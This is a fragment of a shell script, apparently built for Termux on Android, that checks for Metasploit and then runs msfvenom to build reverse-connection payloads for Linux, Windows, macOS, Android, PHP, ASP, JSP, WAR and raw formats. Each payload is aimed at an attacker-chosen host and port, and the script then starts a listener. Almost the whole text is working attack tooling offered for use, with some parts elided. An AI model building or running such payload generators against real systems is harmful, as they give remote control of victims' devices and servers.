...
command -v /data/data/com.termux.com/files/usr/bin/msfconsole > /dev/null 2>&1 || { echo >&2 "I require Metasploit but it's not installed. Install it. Aborting."; exit 1; }
command -v /data/data/com.termux.com/files/usr/bin/msfvenom > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
...
binaries_linux() {
format=".elf"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f elf > $payload_name.elf

}

binaries_windows() {
format=".exe"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f exe > $payload_name.exe
...
binaries_mac() {
format=".macho"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f macho > $payload_name.macho
...
binaries_Android() {
format=".apk"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 R > $payload_name.apk
...
php_payload() {
format=".php"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.php

}

asp_payload() {
format=".asp"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.asp
}

jsp_payload() {
format=".jsp"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.jsp

}
war_payload() {
format=".war"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f war > $payload_name.war

}

python_payload(){
format=".sh"
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f raw > $payload_name.$format
...
/data/data/com.termux.com/files/usr/bin/msfvenom -p $payload LHOST=$lhost LPORT=$default_port3 -f $lang > $payload_name
listener
}
